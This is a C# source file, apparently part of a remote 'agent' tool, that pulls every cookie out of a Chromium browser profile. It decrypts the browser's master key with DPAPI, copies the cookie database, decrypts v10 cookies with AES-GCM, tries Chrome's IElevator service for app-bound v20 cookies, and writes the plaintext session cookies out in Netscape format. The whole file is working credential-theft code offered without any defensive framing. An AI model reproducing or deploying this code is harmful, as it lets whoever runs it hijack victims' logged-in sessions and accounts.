using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Newtonsoft.Json.Linq;

namespace MidnightAgent.Utils
{
    public static class Chromium
    {
        public static string GetCookiesNetscape(string profilePath, string browserName)
        {
            StringBuilder debug = new StringBuilder();
            try
            {
                // 1. Get Master Key
                string localState = Path.Combine(Directory.GetParent(profilePath).FullName, "Local State");
                debug.AppendLine($"LocalState: {localState}");
                
                byte[] masterKey = GetMasterKey(localState, debug);
                if (masterKey == null) return $"Error: Failed to get/decrypt master key from {localState}";

                // 2. Read Cookies DB
                string cookiePath = Path.Combine(profilePath, "Network", "Cookies");
                if (!File.Exists(cookiePath))
                {
                    cookiePath = Path.Combine(profilePath, "Cookies"); // Older path
                    if (!File.Exists(cookiePath)) return $"Error: Cookies file not found at {cookiePath}";
                }
                debug.AppendLine($"Cookie DB: {cookiePath}");

                // Copy to temp
                string tempCookie = Path.GetTempFileName();
                File.Copy(cookiePath, tempCookie, true);

                StringBuilder sb = new StringBuilder();
                var sql = new SqliteHandler(tempCookie);
                int rows = sql.GetRowCount();
                debug.AppendLine($"Rows found: {rows}");

                int successCount = 0;
                
                if (rows > 0)
                {
                    debug.AppendLine("--- ROW 0 DUMP ---");
                    for(int c=0; c<15; c++)
                    {
                        string val = sql.GetValue(0, c);
                        if(val != null && val.Length > 50) val = val.Substring(0, 50) + "...";
                        debug.AppendLine($"Col {c}: {val}");
                    }
                    debug.AppendLine("------------------");
                }
                else
                {
                    debug.AppendLine(sql.GetDebugInfo());
                }

                // Dynamic Column Mapping
                int colHost = 1, colName = 2, colPath = 4, colVal = 12;

                if (rows > 0) {
                    for(int c=0; c<20; c++) {
                        string val = sql.GetValue(0, c);
                        if (string.IsNullOrEmpty(val)) continue;
                        // Check for 'dj' prefix (Base64 for 'v10', 'v20', etc.)
                        if (val.StartsWith("dj")) colVal = c; 
                        else if (val == "/") colPath = c;
                        else if (val.StartsWith(".") && val.Contains(".") && val.Length < 50) colHost = c;
                    }
                    // Name Guess
                    for(int c=1; c<10; c++) {
                         if(c == colHost || c == colPath || c == colVal) continue;
                         string val = sql.GetValue(0, c);
                         if (!string.IsNullOrEmpty(val) && val.Length < 50) { colName = c; break; }
                    }
                    debug.AppendLine($"Mapped Cols -> Host:{colHost} Name:{colName} Path:{colPath} Val:{colVal}");
                }

                int v20Count = 0;
                
                for (int i = 0; i < rows; i++)
                {
                    try
                    {
                        string host = sql.GetValue(i, colHost);
                        string name = sql.GetValue(i, colName);
                        string path = sql.GetValue(i, colPath);
                        string encryptedValue = sql.GetValue(i, colVal); 

                        // Fallback check
                        if (string.IsNullOrEmpty(encryptedValue) || !encryptedValue.StartsWith("dj")) 
                        {
                             for(int c=0; c<20; c++) 
                             {
                                string val = sql.GetValue(i, c);
                                if(val != null && val.Length > 3 && val.StartsWith("dj"))
                                {
                                    encryptedValue = val;
                                    break;
                                }
                             }
                        }

                        if (string.IsNullOrEmpty(encryptedValue)) continue;

                        byte[] encryptedBytes;
                        try { encryptedBytes = Convert.FromBase64String(encryptedValue); } catch { continue; }

                        byte[] plaintext = null;
                        
                        // Check if v20 (App-Bound Encryption)
                        if (encryptedBytes.Length >= 3 && encryptedBytes[0] == 0x76 && encryptedBytes[1] == 0x32 && encryptedBytes[2] == 0x30)
                        {
                            // Try IElevator COM interface for v20
                            string elevatorError;
                            plaintext = ChromeElevator.DecryptAppBound(encryptedBytes, out elevatorError);
                            
                            if (plaintext == null)
                            {
                                v20Count++;
                                if (i == 0) debug.AppendLine($"v20 IElevator: {elevatorError}");
                                continue;
                            }
                        }
                        else
                        {
                            // v10 - use standard DPAPI + AES-GCM
                            plaintext = DecryptValue(encryptedBytes, masterKey, debug, i == 0);
                        }
                        
                        if (plaintext != null)
                        {
                            string value = Encoding.UTF8.GetString(plaintext);
                            sb.AppendLine($"{host}\tTRUE\t{path}\tFALSE\t0\t{name}\t{value}");
                            successCount++;
                        }
                    }
                    catch { }
                }

                try { File.Delete(tempCookie); } catch { }
                
                if (successCount == 0)
                {
                    if (v20Count > 0)
                    {
                        return $"{debug}Error: {v20Count} v20 cookies could not be decrypted. IElevator service may require admin rights or running from Chrome directory.";
                    }
                    return $"{debug}Error: 0 cookies decrypted out of {rows} rows.";
                }
                
                return sb.ToString();
            }
            catch (Exception ex)
            {
                return $"{debug}Crash: {ex}";
            }
        }

        private static byte[] GetMasterKey(string localStatePath, StringBuilder debug)
        {
            try
            {
                if (!File.Exists(localStatePath)) return null;
                string content = File.ReadAllText(localStatePath);
                JObject json = JObject.Parse(content);
                string keyB64 = json["os_crypt"]?["encrypted_key"]?.ToString();
                
                if (string.IsNullOrEmpty(keyB64)) return null;
                
                byte[] keyWithHeader = Convert.FromBase64String(keyB64);
                string header = Encoding.ASCII.GetString(keyWithHeader, 0, 5);
                debug.AppendLine($"Key Header: {header}");
                
                if (header != "DPAPI") 
                {
                     debug.AppendLine("Warning: Key header is not DPAPI!");
                }
                
                byte[] key = new byte[keyWithHeader.Length - 5];
                Array.Copy(keyWithHeader, 5, key, 0, key.Length); // Remove 'DPAPI'

                byte[] decryptedKey = CryptoUtils.DecryptApi(key);
                if (decryptedKey != null) debug.AppendLine($"Master Key: OK (Len: {decryptedKey.Length})");
                else debug.AppendLine("Master Key: FAIL");

                return decryptedKey;
            }
            catch { return null; }
        }

        private static byte[] DecryptValue(byte[] encryptedData, byte[] masterKey, StringBuilder debug, bool verbose)
        {
            try
            {
                // Header is 3 bytes ("v10" or "v20" or etc)
                if (encryptedData.Length < 31 || encryptedData[0] != 0x76) 
                {
                    if(verbose) debug.AppendLine($"Row Data Invalid Header: {encryptedData[0]:X}");
                    return null;
                }
                
                // Check version: v10 (0x76 0x31 0x30) vs v20 (0x76 0x32 0x30)
                string version = System.Text.Encoding.ASCII.GetString(encryptedData, 0, 3);
                if (version == "v20")
                {
                    // v20 = App-Bound Encryption (Chrome 127+)
                    // Cannot be decrypted with standard DPAPI master key
                    if(verbose) debug.AppendLine("WARNING: v20 (App-Bound Encryption) detected. This requires Chrome's internal IElevator service and cannot be decrypted externally.");
                    return null;
                }

                byte[] nonce = new byte[12];
                Array.Copy(encryptedData, 3, nonce, 0, 12); // Skip 3 byte version header

                byte[] ciphertext = new byte[encryptedData.Length - 3 - 12 - 16];
                Array.Copy(encryptedData, 15, ciphertext, 0, ciphertext.Length);

                byte[] tag = new byte[16];
                Array.Copy(encryptedData, encryptedData.Length - 16, tag, 0, 16);

                int errorCode;
                byte[] result = CryptoUtils.DecryptAesGcm(masterKey, nonce, ciphertext, tag, out errorCode);
                
                if (result == null && verbose)
                {
                    debug.AppendLine($"Decrypt Failed: NTSTATUS 0x{errorCode:X}");
                }
                
                return result;
            }
            catch(Exception ex) 
            {
                if(verbose) debug.AppendLine($"Decrypt Exception: {ex.Message}");
                return null; 
            }
        }
    }
}
